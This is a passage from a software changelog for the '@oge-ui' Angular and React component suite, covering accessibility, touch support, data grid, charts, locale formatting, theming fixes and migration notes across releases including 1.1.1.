  `selectAllColumnHeader`, `reorderRow`, `reparentColumnHeader`,
  `reparentRow`), in both layers.
- Boolean cells render their glyph `aria-hidden` plus a visually hidden word
  from the new `booleanTrueLabel` / `booleanFalseLabel` messages.
- **`weekendDays`** on the scheduler (day/week, work week, month, timeline)
  and the Gantt (off-day shading), defaulting to the locale's weekend via
  core's new `resolveWeekendDays()` (`Intl.Locale#getWeekInfo`, falling back
  to Saturday + Sunday).
- Column resizing works in RTL (handle on the logical inline-end edge,
  mirrored pointer delta) in the grid and tree list.

### Scheduler recurrence (RRULE)

- `UNTIL` / `EXDATE` / `RDATE` / `DTSTART` values ending in `Z` are UTC
  (previously read as local wall time).
- `BYSETPOS`, `BYHOUR` and `BYMINUTE` are parsed, serialized and expanded in
  RFC order.
- The rule text may be an iCalendar block — `RRULE` plus `DTSTART` /
  `RDATE` / `EXDATE` lines (CRLF/LF, folding, `VALUE=DATE`); `RDATE` adds
  occurrences without consuming `COUNT`, `EXDATE` merges with the
  recurrence-exception field. Still rejected: `TZID`, `BYYEARDAY`,
  `BYWEEKNO`, `BYSECOND`, `EXRULE`, `VALUE=PERIOD`.

### Accessibility

- **Forced colors and focus**: a forced-colors-safe focus-ring mixin
  replaces every `outline: none`, and system-colour blocks cover selection,
  focus, toggles, sliders, tabs, buttons, progress, Gantt, Kanban,
  scheduler, charts, popups, tooltips and skeletons.
- **High-contrast theme** — `@oge-ui/core/themes/high-contrast.css`
  (`.oge-theme-high-contrast` / `data-oge-theme="high-contrast"`, AAA
  contrast spec), registered by
  `ng add @oge-ui/<package> --theme=high-contrast`.
- **Reduced motion**: `prefers-reduced-motion` blocks in every animating
  stylesheet; `prefersReducedMotion()` / `motionScrollBehavior()` in
  behavior for smooth scrolling.
- **Target sizes**: 24 px (44 px under `pointer: coarse`) hit areas for Gantt
  grips, scheduler resize handles, toast close, Kanban card actions and the
  column resize handle; hover-only affordances also appear on focus, on
  selection and under `hover: none`.
- **Keyboard alternatives for every drag** (WCAG 2.1.1 / 2.5.7): grid and
  tree-list column resize (Alt+Arrow on a header, or the focusable
  `role="separator"` handle), column reorder (Ctrl+Shift+Arrow), row reorder
  (Ctrl+Arrow), tree reparenting (Ctrl+Arrow indent / outdent), group-panel
  chips and column-chooser items; pivot field chips (field menu, Ctrl+Arrow
  reorder / move between areas, Delete) with a single-tab-stop APG grid;
  Kanban columns as lists of focusable cards with one Tab stop per column
  and Tab-reachable card content; scheduler grids with a `columnheader` row,
  `aria-selected` and `aria-readonly`.
- **One live announcer**: `OgeLiveAnnouncerCore` in behavior with
  `OgeLiveAnnouncer` (Angular) / `useOgeLiveAnnouncer` (React); toast, Gantt
  and the uploader speak through it, and the grid and tree list announce
  sort, filter / search result counts, paging, expansion, select-all,
  keyboard moves and blocked saves (`announcements` opt-out).
- Edit cells wire `aria-invalid`, `aria-errormessage` and
  `aria-describedby` to their error text.
- Empty grid / tree-list bodies render the no-data text as a
  `row > gridcell`, and the rowgroup is `aria-busy` while loading.

### Touch and mobile

- **One pointer-gesture engine** in behavior — `beginPointerGesture`,
  `beginPointerDragDrop`, `prepareTouchDrag`, `createAutoScroller` (3 px
  threshold, pointer capture, Escape / blur cancel, touch long press,
  `touch-action` management, edge auto-scroll). HTML5 drag and drop is gone
  from the packages: grid header reorder, group panel, column chooser and row
  drag, tree-list reparenting, pivot field chips and Kanban run on it, and
  Kanban cards lift on a 300 ms touch hold.
- **Adaptive popups** — `adaptiveMode` (`'none'` default | `'auto'`) and
  `adaptiveBreakpoint` (600) on the select box, tag box,
  autocomplete, tree select, date box, date range box, color box and
  drop-down button, globally through `provideOgeInputsConfig` /
  `provideOgeButtonsConfig` and the React providers; `oge-popup` /
  `<OgePopup>` gain the titled bottom-sheet (`adaptive: 'sheet'`, lists and
  pickers) / full-screen (`'fullscreen'`, calendars) presentation
  (`OgeAdaptiveSheetCore`: scroll lock, inert background, focus trap, swipe
  to dismiss).
- Anchored panels position against the **visual viewport** (on-screen
  keyboard, pinch zoom); `dvh` / `svh` limits; safe-area insets on modal,
  toast regions and drawer panels; 16 px input text under `pointer: coarse`.
- Grid and tree list **`columnHidingMode`** (`'detail'` default | `'hide'`):
  columns hidden by `hidingPriority` are revealed in a per-row detail line.
- Scheduler **`adaptiveView`** switches to the agenda below a width; the
  BPMN editor and the pivot field areas / chooser adapt to their container.

### Data grid (G1)

- **Cell ranges**: `selectionMode: 'cell'` with the `selectedRanges` model
  and `rangeSelectionChanged`, Shift+click / drag / Arrow and Ctrl+click; TSV
  copy and multi-cell **paste** (native `copy` / `paste` events,
  `pasteText()`), Ctrl+D / Ctrl+R and the **fill handle**, Ctrl+Z / Ctrl+Y
  over one edit history.
- **Styling hooks**: `rowClass` / `cellClass`, `rowPrepared` /
  `cellPrepared`, and column `conditionalFormats` (rules, data bars, colour
  scales, icon sets).
- **Pinned and sticky rows**: `pinnedTopRows` / `pinnedBottomRows` and the
  `stickyGroupRows` overlay.
- **Spans**: `cellSpan` and column `mergeCells`, with `aria-rowspan` /
  `aria-colspan` and span-aware keyboard navigation.
- **Auto-fit**: `autoFitColumn(s)`, resize-handle double-click, the header
  menu's "Size to fit" and `columnAutoWidth`; `cellHintEnabled` overflow
  tooltips.
- **Cross-grid row drag**: `rowDragGroup` / `allowDropInsideRow` with
  `rowDragStart` / `rowDragOver` / `rowDrop` / `rowDragEnd`.
- **Excel-style header filter**: `headerFilter.mode`
  `'list' | 'conditions' | 'both'` and a year / month / day date tree.
- Column `asyncValidators` (promise-returning validators in React) with
  `aria-busy` pending editors.
- `dataType: 'datetime'`; `groupInterval` gains hour / week / quarter and
  numeric buckets.
- Pager `showFirstLast`, `showPageInput` and a pager info template
  (`*ogePagerInfoTemplate` / `renderInfo`).
- **Rich export** on a shared export model in `@oge-ui/behavior` — XLSX with
  merged band headers, frozen header rows and pinned columns, column widths,
  number / date formats, group outline levels, summary rows as values or
  `SUBTOTAL` formulas, cell styles (`cellStyle`, styled `customizeCell`) and
  the auto-filter; PDF with repeated banded headers, group and summary rows,
  fitted widths, cell styles, page header / footer callbacks and page
  numbers. `getExportData` takes `selectedRowsOnly`, `visibleColumnsOnly`,
  `groups` and `summaries`.

### Tree list and pivot (G1)

- Tree list: `summary.totalItems` footer row and `summary.recursiveItems`
  per-parent aggregates (in exports too); `remoteOperations.filtering`
  sends filter, search and header-filter requests to the source; new
  `export-pdf` entries in both layers.
- Pivot: **chart binding** — `toChartSeries(result)` / `getChartData()`
  hand plain data to `@oge-ui/charts` (no package dependency);
  **`calculatedFields`** with formats, display modes and running totals;
  `labelFilter` / `valueFilter` / `topN` per field, applied before
  aggregation; cell / row-header / column-header templates (React
  `renderCell` / `renderRowHeader` / `renderColumnHeader`);
  `rowHeaderLayout` `'compact' | 'outline' | 'tabular'`; `resultChange`;
  new `export-pdf` entries.

### Inputs and forms (G4)

- **Input masks** on one engine (`OgeMaskCore`): the text box's `mask`,
  `maskRules`, `maskChar`, `showMaskMode`, `includeLiterals`,
  `maskInvalidMessage`, `maskValidation` and `maskCompleted`, plus the new
  **`OgeMaskedTextBox`** (`@oge-ui/inputs/masked-text-box`).
- Date box: segment entry (`useMaskBehavior`), `hour12`, `showSeconds`,
  `showTodayButton` / `showNowButton`; date range box `presets`
  (`ogeDateRangePresets`) and `type: 'time' | 'datetime'`.
- Number box `formatWhileTyping`, fraction limits while typing and
  `wheelStep`.
- New editors, each with its own entry point: **`OgeColorGradient`**
  (`color-gradient`), **`OgeColorPalette`** (`color-palette`),
  **`OgeCheckBoxGroup`** (`check-box-group`), **`OgeToggleGroup`**
  (`toggle-group`) and **`OgeMultiColumnComboBox`**
  (`multi-column-combo-box`: columns, APG combobox-with-grid keyboard,
  search across columns, single / multiple, virtual + remote).
- **Remote load-on-scroll** for the list editors: `dataSource` (any
  `DataSource`, optional `byKey`), `pageSize`, `pageLoaded`, `reload()`,
  debounced server search and `AbortSignal` cancellation.
- **Select box**: `groupTemplate`, `fieldTemplate`, `headerTemplate`,
  `footerTemplate` (React `renderGroup` / `renderField` / `renderHeader` /
  `renderFooter`) and cancelable `opening` / `closing { reason }`.
- **Tag box parity**: `tagTemplate`, item / group templates, lazy items,
  loading, custom values, `showSelectAll` (`selectAll()` /
  `unselectAll()`, `selectAllValueChanged`), `maxSelectedItems` +
  `maxSelectedItemsMessage`, `opening` / `closing`, remote `dataSource`.
- Tree select `showSelectionAs: 'chips'` with `maxDisplayedTags`.
- Forms (both layers): server errors — `setErrors()`, `setFieldErrors()`,
  `clearErrors()` (`OgeFormServerErrors`; shown at once, cleared on edit);
  declarative `visibleWhen` / `requiredWhen` / `disabledWhen` conditions;
  the **`compare`** rule (`comparisonTarget`, `comparisonType`).

### Charts (G2)

- **Orientation and layout**: `rotated` charts (horizontal bars and every
  other series type), value- and argument-axis `constantLines` / `strips`,
  `panes` with per-pane value axes under one shared argument axis
  (price + volume), axis `breaks`, `tickInterval`, `minorTicks`,
  `allowDecimals` and label `format` / `template` / `overlap`.
- **Interaction**: pinch-zoom and two-finger pan, `rtlEnabled` (follows the
  page `dir`), a one-time draw-in `animation` that respects reduced motion,
  and range-selector `periods` (1M, 3M, 6M, YTD, 1Y, All, custom).
- **Series and analytics**: per-point colour (`colorField`,
  `customizePoint`), full data labels (position, format, template, overlap
  resolution, pie connectors), trendlines and the SMA / EMA / Bollinger /
  MACD / RSI indicators (pure `ogeSma` … functions plus an `indicator`
  series), and new types: `waterfall`, `boxPlot`, `histogram`, `pareto`,
  `ohlc`, stacked and full-stacked lines / spline areas, nested doughnut
  rings and the polar `radialBar`.
- **Export**: `exportChartToJpeg`, a new `/export-pdf` entry
  (`exportChartToPdf`, Unicode title via `setOgePdfDefaultFont`) and
  `print()` on every chart.

### Locale formatting, plurals and RTL (W4)

- **Shared `Intl` cache** in `@oge-ui/core` (`ogeNumberFormat`,
  `ogeDateTimeFormat`, `ogeRelativeTimeFormat`, `ogePluralRules`,
  `ogeParseNumber`); hot formatters across the suite now use it.
- **`locale`** input / config on the grid, tree list and pivot (Angular:
  input → provider → `LOCALE_ID`; React: prop → provider → browser) and a
  declarative column / field `format` (`number`, `currency`, `percent`,
  `date`, `time`, `datetime`, fraction digits, styles, `pattern`) used by
  cells, summaries, filters, editors, paste and exports.
- **Plural-aware messages**: `ogeFormatMessage` (ICU-lite: plural,
  selectordinal, select, number / date arguments) drives row-count,
  selection, pager, validation-summary, upload and "+N more" texts.
- **Right-to-left** via one direction helper (`ogeResolveDirection`,
  `observeDirection`): scheduler, Gantt, Kanban and pivot mirror keys,
  drag math and layout and take `rtlEnabled`; the BPMN chrome mirrors while
  its canvas stays LTR.

### Docs site

- `https://www.ogeui.com` is the canonical host; every page has its own
  description, a `BreadcrumbList` and a sitemap `lastmod`; legacy paths
  answer with host redirects.
- Code blocks are framed with working syntax colours; npm download counts
  are collected at build time; the shell imports component entries only
  (initial bundle under 1 MB).

### Migration notes / behaviour changes

- **RRULE**: a plain `BYDAY` (no ordinal) in a `MONTHLY` / `YEARLY` rule now
  means _every_ such weekday of the month (RFC 5545) instead of the first
  one; write `1MO` or add `BYSETPOS=1` for the old meaning. Duplicate
  candidates — e.g. a `BYMONTHDAY` value listed twice — collapse into one
  occurrence.
- **Boolean cells** announce the new `booleanTrueLabel` /
  `booleanFalseLabel` messages (default "Yes" / "No"); translate them along
  with `booleanTrue` / `booleanFalse`, which CSV and filter lists keep using.
- **`columnHidingMode` defaults to `'detail'`**: columns hidden by
  `hidingPriority` now show in a per-row detail line behind a toggle. Set
  `columnHidingMode="hide"` for the 1.1 behaviour.
- **Pivot**: dropping a field on a chip inserts it _before_ that chip, and a
  drop on an area really appends at its end. `OGE_PIVOT_FIELD_DRAG_TYPE` and
  `OgePivotDragLike` are deprecated — field drag no longer uses HTML5 drag
  and drop.
- **Exports**: empty (`null` / `undefined`) boolean values export as empty
  cells instead of the `booleanFalse` text.
- **CSV guard**: leading whitespace no longer hides a formula lead, so a text
  cell `" -5"` now exports as `' -5`; a plain number such as `-5` stays
  numeric.
- **`sanitizeUrl` is an allowlist**: any scheme other than relative,
  `http(s)`, `mailto`, `tel`, `ftp` and `sms` becomes `about:blank`; pass
  `allowedSchemes: ['web+app']` for a custom protocol.
- **Tag box** overflow chip reads `+N more` (the `moreTags` message,
  default `'+{count} more'`) instead of `+N`.
- **Adaptive mode is opt-in**: `adaptiveMode` defaults to `'none'`, so popups
  keep their 1.1 presentation until you set `'auto'` (per editor or in the
  family config).
- Angular peers are `>=22.0.0 <24.0.0`.
- **Locale formatting (grid, tree list, pivot)**: a new `locale` input / prop
  and config key (`provideOgeGridConfig({ locale })`,
  `provideOgePivotConfig({ locale })`, the React providers) drives default
  date cells, declarative column `format`s
  (`{ type: 'currency', currency: 'EUR' }` and friends), summaries, group
  captions, header-filter values, the filter row's number parsing, the pager
  and exported text. Unset, the Angular layer uses `LOCALE_ID` — so an
  Angular app that never set `LOCALE_ID` now formats default date cells as
  `en-US` instead of the browser language; provide `LOCALE_ID` or `locale`
  to choose. React falls back to `navigator.language`. Unformatted number
  columns still render the raw value. The pivot's percent display modes use
  the locale's percent layout (`%33,3` in tr-TR, `33,3 %` in de-DE).
- **Plural-aware messages**: count messages are ICU plurals rendered by
  `ogeFormatMessage` (`'{count, plural, one {# row} other {# rows}}'`), and
  numbers inside them use the locale's digits and grouping (`1,500 rows`).
  Plain `{count}` patterns keep working. Deprecated for one minor, still
  honoured with a dev-mode console warning:
  - grid / tree list `rowCountOneAnnouncement` → put the singular into
    `rowCountAnnouncement` as a `one {…}` branch;
  - grid / tree list `rowsSuffix` → use `pagerInfo` (a suffix cannot
    inflect; a catalog that still sets it keeps the old `<count> <suffix>`
    pager text);
  - forms `validationSummaryTitleOne` → fold it into
    `validationSummaryTitle`.
    The selection, paste / fill / undo / redo announcements, the uploader's
    `filesAdded` / `allCompleted` and the tag box's `moreTags` accept ICU
    plurals too. The pager's default text for one row is now `1 row`.

## 1.1.1 — 2026-10-01

Every package moves to 1.1.1 together — the first 1.x release. The version
jump marks two things finishing at once:

- **React and Angular are at full parity.** Every component family now ships
  in both render layers — tree list, kanban, charts, scheduler, gantt, pivot
  and BPMN joined React in this release — and every docs page branches between
  them (the router-driven demos stay Angular-only, as recorded exceptions).
  The commercial families run on new framework-free **`@oge-ui/<family>-engine`**
  packages (ADR 0003), so both layers execute the same engine without moving
  commercial code into the MIT `@oge-ui/behavior`.
- **The gaps the first production consumers hit are closed.** Theming that
  `:root` could not override, dark mode only reachable through the grid, a
  grid that pulled the forms family into every bundle, no cursor paging, no
  keyboard context menus, no wrapper-friendly columns, no runtime language
  switch — each removes a workaround an app had to write.

New packages: `@oge-ui/react-tree-list`, `@oge-ui/react-kanban`,
`@oge-ui/react-charts`, `@oge-ui/react-scheduler`, `@oge-ui/react-gantt`,
`@oge-ui/react-pivot`, `@oge-ui/react-bpmn` and the engines
`@oge-ui/kanban-engine`, `@oge-ui/charts-engine`, `@oge-ui/scheduler-engine`,
`@oge-ui/gantt-engine`, `@oge-ui/pivot-engine`, `@oge-ui/bpmn-engine`. No
existing import path changed; the few behavior changes are listed under
"Fixed" below.

### Added (React)

- **Every data-grid docs page now has a React view.** The last six —
  playground, sorting & paging, virtual scroll (rows, 200 virtualized columns,
  measured row heights), infinite & remote virtual scroll over 1M rows,
  remote data (`CustomDataSource` with its request log, `CursorDataSource`
  under infinite scrolling) and live updates (`DataSource.changes` +
  `highlightChanges`, `renderCell`) — branch to `@oge-ui/react-grid` on the
  same routes, section for section, so the family's coverage is `'*'` and no
  grid page shows the React coverage notice any more.
- **`@oge-ui/react-scheduler` + `@oge-ui/scheduler-engine` (commercial,
  ADR 0003).** The scheduler's framework-free half now lives in its own
  commercial engine package — the former `engine/` folder plus the
  pointer-gesture machine, view-model builders for every view, keyboard
  maps, the editor mapping and default form items, the message catalog and
  `OgeSchedulerCore` (working set, DataSource write-through, cancelable CRUD
  pipelines, occurrence-vs-series routing, navigation, context menu,
  announcements, reminders). The Angular `@oge-ui/scheduler` is rewired onto
  it with its specs unchanged, and `<OgeScheduler>` for React renders the
  same markup from the same engine: all eight views, drag/resize/
  drag-to-create with Escape-cancel, recurrence, resources, reminders, the
  popup, the `<OgeForm>` editor, the built-in context menu, render props,
  an imperative handle and `<OgeSchedulerConfigProvider>`. Both docs pages
  branch; the family is in the parity gate. Fix riding along: the editor's
  default form items are built for the appointment being opened (recurrence
  fields of a recurring appointment are visible on open), not for the
  previously opened one.

- **`@oge-ui/react-tree-list` — the React tree list, at full parity with
  `@oge-ui/tree-list` (roadmap R7).** `<OgeTreeList>` renders flat
  `id`/`parentId` data or nested payloads (`itemsExpr`), loads children lazily
  per expansion from any `DataSource` (with remote filter-match discovery and
  bulk subtree loads for recursive selection), filters client-side with
  ancestor preservation (filter row + operator menu, header filter, search
  panel with highlighting, filter builder, `filterMode`), sorts siblings,
  selects recursively with tri-state checkboxes, pages the visible rows,
  virtualizes rows and columns, edits in all five modes (`addRow(parentKey)` +
  `onInitNewRow`), reparents by drag & drop, speaks WAI-ARIA treegrid on the
  keyboard (and opens context menus from the Menu key / Shift+F10), and ships
  pinned / resizable / reorderable columns, bands, the column chooser,
  `stateKey` persistence and synchronous CSV + outlined Excel export
  (`@oge-ui/react-tree-list/export-excel`). Every Angular input, output and
  public method has its prop, callback or handle member — the
  `docs-tools:parity` gate compares the two tables member for member.
- **One tree engine for both layers.** The Angular tree list's inline data
  model — index, expansion polarity, filter predicate and visible keys, the
  flattened rows, lazy child requests, remote match discovery, subtree loads,
  recursive selection, paging over the flattened rows, the keyboard hierarchy
  hooks, drop validation and in-place reparenting, header-filter values and
  the export shape — moved into `@oge-ui/behavior` as `OgeTreeListCore`, and
  the Angular component was rewired onto it (its 99 specs unchanged). The
  filter-row, header-filter and selection gestures now run on the grid's
  shared helpers, the drop zones on the tree view's `resolveTreeDropPosition`,
  and the outlined workbook builder (`buildTreeExcelWorkbook`) moved to
  `@oge-ui/behavior/export-excel`, re-exported from both tree packages so
  neither public API changed.
- **`@oge-ui/react-grid/foundation`** — the React half of the grid foundation
  (the editing bridge, the reactivity adapter, the filter-builder editor),
  shared with the React tree list exactly as `@oge-ui/grid/foundation` is with
  the Angular one. `@oge-ui/react` re-exports the tree list and bundles its
  stylesheet.
- The tree-list docs pages all branch on the framework switch, section for
  section, with React demos, API tables and `llms.txt` coverage.
- **`@oge-ui/react-bpmn` and `@oge-ui/bpmn-engine` — the BPMN editor in
  React, on one engine (ADR 0003).** The BPMN family's framework-free engine
  now ships as its own commercial package, `@oge-ui/bpmn-engine`: the model,
  the BPMN XML + DI reader/writer, the JSON envelope, SVG export, routing,
  snapping, alignment, rules, the command stack — and the editor core both
  layers run (`OgeBpmnEditorCore`: every tool, pointer gesture, the canvas
  keyboard map, clipboard, search, announcements, autosave and the view
  models), plus the properties-panel view model, the palette key map, the
  message catalog and `@oge-ui/bpmn-engine/testing` sample documents. The
  Angular `@oge-ui/bpmn` is rewired onto it with its public API unchanged
  (97 specs pass with only import paths changed). The new
  `<OgeBpmnEditor>` renders the same `.oge-bpmn-*` markup from the Angular
  SCSS: palette, tool strip, context pad and align flyout, properties
  panel, minimap, element search, header, overlays, pools and lanes —
  controlled `mode` / `zoom` pairs, an `on*` callback per output, a `ref`
  handle per public method and `<OgeBpmnConfigProvider>`. Overlay `html` is
  sanitized into real elements (no `dangerouslySetInnerHTML`). Commercial,
  like the Angular package, and not part of the MIT `@oge-ui/react`
  umbrella.

- **`@oge-ui/react-kanban` and `@oge-ui/kanban-engine`** — the Kanban board
  in React, at full parity with `<oge-kanban>`: columns and swimlanes, WIP
  limits, per-column virtualization, drag & drop with Escape-cancel and edge
  auto-scroll, Ctrl+Arrow keyboard moving with announcements, column reorder
  and add, context menu, toolbar search and the edit dialog, with every input
  as a prop, the models as controlled/uncontrolled pairs, the outputs as `onX`
  callbacks, the methods on a `ref` handle, the templates as `renderCard` /
  `renderColumnHeader` and `<OgeKanbanConfigProvider>` for the config. Both
  layers run the new framework-free, commercially licensed
  `@oge-ui/kanban-engine` (ADR 0003); the Angular `@oge-ui/kanban` was rewired
  onto it with an unchanged public API. Fixed on the way: a move into a cell
  with no midpoint order room dropped the moved card's renumbered order.

- **`@oge-ui/react-charts` — the charts family in React, and
  `@oge-ui/charts-engine` under both layers (ADR 0003).** `<OgeChart>`,
  `<OgePieChart>`, `<OgePolarChart>` and `<OgeRangeSelector>` with every
  member of their Angular counterparts (controlled `visualRange` /
  `selectedPoints` / `selectedSlices` / `value` pairs, `on*` callbacks incl.
  the cancelable `onLegendClick` / `onTooltipShowing`, `ref` handles,
  `renderTooltip` / `renderLegendItem` / `renderAnnotation`,
  `<OgeChartsConfigProvider>`) plus the `@oge-ui/react-charts/export-image`
  entry. They render the Angular markup from the same view models, so the
  Angular stylesheet applies unchanged. The framework-free half of the family
  — scales, series layout, path builders, pie/radar geometry, the new
  cartesian/pie/polar/range-selector view-model builders, keyboard maps, the
  gesture machine, the message catalog and the image exporter — moved out of
  `@oge-ui/charts` into the new commercial `@oge-ui/charts-engine`, and the
  Angular components were rewired onto it with their specs unchanged
  (`@oge-ui/charts`' public API is unchanged). Both packages carry the charts'
  commercial license; neither enters the MIT `@oge-ui/react` umbrella.
  Also fixed on the way, in both layers: an `argumentField` given only through
  `commonSeries` was ignored by argument-axis detection (the docs' stacked
  series demo plotted nothing), and the Angular charts' size observers are now
  disconnected on destroy.

- **`@oge-ui/react-pivot` + `@oge-ui/pivot-engine` (commercial, ADR 0003).**
  The pivot grid's logic above `@oge-ui/core`'s MIT `PivotEngine` — field
  layout, header layout and virtualization math, the remote-store adapter,
  header/measure menus, value filters, the field chooser, keyboard
  navigation, persistence snapshots, the message catalog and the Excel
  workbook builder — moved into the new framework-free `@oge-ui/pivot-engine`,
  and `@oge-ui/pivot` became a thin seam over it (its specs pass unchanged;
  `buildPivotWorkbook` is re-exported from `@oge-ui/pivot/export-excel`, whose
  `exceljs` optional peer now sits on the engine). `@oge-ui/react-pivot`
  renders the same `.oge-pivot-*` markup over the same core: `<OgePivotGrid>`
  with a `fields` array, every input as a prop, `onCellClick` /
  `onCellDblClick` / `onFieldLayoutChange` / `onStateChange`, a `ref` handle
  (`drillDown`, `expandAll`, `state`, `getCsv`, `showFieldChooser`, …),
  `<OgePivotMessagesProvider>`, `stateKey` through `OgeGridStateStorageProvider`,
  and `@oge-ui/react-pivot/export-excel`. The Angular pivot gains the matching
  `[fields]` input (the data twin of `<oge-pivot-field>` children). All three
  pivot-grid docs pages branch to React; the family is in the parity gate.
- **`@oge-ui/react-gantt` and `@oge-ui/gantt-engine` (commercial).** Per ADR
  0003 the Gantt engine left the Angular package for a framework-free,
  commercially licensed `@oge-ui/gantt-engine`: the kernel, the message
  catalog and config defaults, the public types, the pointer-gesture machine
  and `OgeGanttCore` — the whole controller (stores, undo/redo, view models,
  editing pipelines, keyboard map, gestures, context-menu model) — plus the
  `/export-excel`, `/export-pdf` and `/export-image` builders (optional
  `exceljs` / `jspdf` peers). `@oge-ui/gantt` runs on it with an unchanged
  public API (it now also exports `OgeGanttResource`; its `exceljs` /
  `jspdf` optional peers moved to the engine). The new React `<OgeGantt>`
  mirrors every input, output and method (props, `onX` callbacks, a `ref`
  handle, `renderTask` / `renderTooltip`, `<OgeGanttConfigProvider>`) on the
  same core and the same stylesheet, with export entry points taking the
  handle. Not part of the MIT `@oge-ui/react` umbrella.

### Fixed (theming)

- **A `:root` token override now works — on every component.** Each component
  re-declared the full `--oge-*` set on its own host (`.oge-button { --oge-bg:
… }`), and an element's own declaration beats every inherited value, so
  `:root { --oge-accent: … }` silently lost and the documented "scope tokens to
  a subtree" example did nothing. Consumers wrote `html .oge-button, html
.oge-grid, …` bridges listing twenty-odd hosts. The defaults now sit once on
  `:where(:root, .oge-theme-light, [data-oge-theme='light'], …)` — zero
  specificity — so any declaration wins wherever it is placed. Existing
  higher-specificity bridges keep working.
- **Tints follow the accent.** `--oge-accent-soft`, `--oge-accent-25`,
  `--oge-focus-ring`, the focused-row and update-flash tints (previously a
  hard-coded indigo that matched no theme) are now derived from `--oge-accent`:
  set the accent on `:root` and the rest follow.
- **Dark mode is scope-based and ships for everyone.** The theme files listed
  component hosts one by one (the Tailwind bridge covered 12 of them — no
  buttons, inputs or overlays) and lived only in `@oge-ui/grid`, so React-only
  and buttons-only apps had to install the Angular grid to get a dark theme.
  They now target scopes — `.oge-theme-dark` / `[data-oge-theme='dark']`, a new
  `oge-theme-auto` / `data-oge-theme="auto"` that follows
  `prefers-color-scheme`, and `oge-theme-light` for a light island — and ship
  as **`@oge-ui/core/themes/{dark,tailwind,bootstrap}.css`** (the
  `@oge-ui/grid/themes/…` paths keep working). The Bootstrap bridge also
  follows `data-bs-theme` subtrees. `ng add … --theme=<name>` makes
  `@oge-ui/core` a direct dependency so the path resolves under pnpm; before,
  it skipped the theme for any package other than the grid.
- **`sideEffects` no longer lets bundlers drop a theme import.** `@oge-ui/core`
  and `@oge-ui/grid` declared `"sideEffects": false`, so webpack could discard
  `import '@oge-ui/core/themes/dark.css'` from a React entry; both now declare
  `["*.css"]`.
- **Scrollbars are visible.** Every scroll area the suite draws painted its
  thumb in `--oge-border-color`, nearly invisible on a mouse desktop — wide
  grids looked cut off at the right edge with no visible way across. New
  `--oge-scrollbar-thumb` / `-thumb-hover` / `-track` tokens (dark values
  included) drive them all.
- **Misspelt tokens that always rendered their fallback:** the form hint and
  empty text read `--oge-text-muted` (grey `#6b7280` on every theme, dark
  included), the gantt scale border `--oge-border`, the splitter's empty text
  `--oge-muted-text-color`. All now read real tokens, and a spec fails the
  build when a stylesheet reads an undeclared token.
- **White text on the accent in dark mode.** The pager's current page and the
  gantt/kanban primary buttons hard-coded `#fff`, which fails contrast on the
  dark theme's light-blue accent; they use `--oge-severity-contrast`.
- New tokens: `--oge-row-alt-bg`, `--oge-row-focused-bg`,
  `--oge-update-flash-bg`, `--oge-skeleton-color`, `--oge-switch-thumb`,
  `--oge-font-mono`, `--oge-scrollbar-*` — each previously a literal fallback
  inside one component.

### Added (grid)

- **Keyboard context menus.** The Menu key and Shift+F10 on a focused body or
  header cell open the row / header menu at the cell (start/bottom corner,
  RTL-aware); the native `contextmenu` echo some browsers send afterwards is
  swallowed, a real right-click never is. `OgeContextMenuEvent` and
  `OgeHeaderContextMenuEvent` gain `source: 'pointer' | 'keyboard'` and the
  originating `event`. Grid, tree list and React grid share one helper in
  `@oge-ui/behavior`.
- **Immediate change events:** `sortChanged` `{ sort, previousSort }` and
  `pageChanged` fire in the same frame as the change — `stateChange` is
  debounced, so a caption or a server request following it lagged the click.
- **Evented expand/collapse** for group and master-detail rows:
  `rowExpanding` / `rowCollapsing` (cancelable) and `rowExpanded` /
  `rowCollapsed`, from pointer, keyboard and `expandRow()` / `collapseRow()`
  alike. `focusedCellChanged` reports keyboard/pointer cell moves. Both close
  ROADMAP rows that sat at "Partial".
- **`alignment` on columns** (`'start' | 'center' | 'end'`, logical). The
  `dataType="number"` default stays end-aligned; headers now follow their
  cells, so a number column's caption sits over its figures.
- **Programmatic columns carry every column option.** `[columns]` accepted
  only `{ field, caption }`; `OgeColumnDef<T>` now mirrors `<oge-column>`
  (types, widths, lookups, summaries, templates as `TemplateRef`s…). It is
  the way to build a wrapper component around the grid — Angular's content
  queries never see `<oge-column>`s projected through another component.
  Tree list too.
- **`showColumnChooser(anchor?)` / `hideColumnChooser()`** — open the chooser
  from your own header bar with `columnChooser` off, so the grid draws no
  second toolbar row. **`getTotalSummaryValue(field, type?)`**.
- **Toolbar placement:** `ogeToolbar="before" | "center" | "after"` (bare =
  after, as before) — filters and primary actions on the start edge.
- **Grouping from the header menu without the group panel:**
  `grouping: { contextMenuEnabled: true }`.
- **Date-range filter** in the filter row: date columns offer a `between`
  operator that swaps the cell to a date-range picker (whole days, either end
  open).
- **`exportCsv(fileName, options)`** takes `getCsv()`'s options
  (`customizeCell`, `scope`…), so a customized export still fires `exporting`.
- **`CursorDataSource`** (`@oge-ui/core`) adapts a cursor-paginated endpoint
  (`?after=…` → `{ items, nextCursor }`) to the grid: pair it with infinite
  scrolling; each page is fetched once per query and concurrent windows share
  one walk.

### Fixed (grid)

- **Dates grouped by object identity**: two rows holding `new Date(…)` for the
  same moment became two groups. Dates now bucket by value, and date columns
  group by calendar day by default (`groupInterval: 'day' | 'month' |
'year'`, sent to servers as `LoadOptions.group[].interval`; deferred groups
  fetch their children with a matching date range).
- **A stored `stateKey` grouping overrode a bound `[groupBy]`.** A bound
  `groupBy` is controlled and now wins.
- **"Box in a box" in the filter row**: `.oge-filter-input` gave the editor
  components' hosts a second border and padding.
- **Row right-click did nothing in the React grid** unless `renderRow` was
  set — standard rows had no `onContextMenu` binding.

### Changed (bundle size)

- **The grid no longer ships `@oge-ui/forms` in your initial bundle.** Form
  and popup editing render their `<oge-form>` inside `@defer`, so forms and
  its tabs/upload/navigation cone load when a form editor first opens. Measured
  on a minimal CLI app rendering one `<oge-grid>`: initial JS 1,080 KB →
  913 KB, with a 184 KB lazy chunk.

- **Per-component entry points for `@oge-ui/inputs` and `@oge-ui/layout`**
  (`@oge-ui/inputs/text-box`, `@oge-ui/inputs/date-box`, `@oge-ui/layout/toolbar`,
  …). `@oge-ui/inputs` and `@oge-ui/layout` still export everything, unchanged.
  Each family used to be one module, and bundlers split code per module: when
  two lazily loaded parts of an app used different editors, all of inputs landed
  in the eager chunk. The suite's own packages now import per component; apps
  can too. Same one-grid measurement: **913 KB → 704 KB** initial (1,080 KB
  before this release).

### Added (all Angular families)

- **Switch the UI language at runtime.** Every `provideOge…Config()` (all 25)
  also accepts a function: `provideOgeGridConfig(() => ({ messages: lang() ===
'tr' ? TR : {} }))`. The config then follows the signals the function reads,
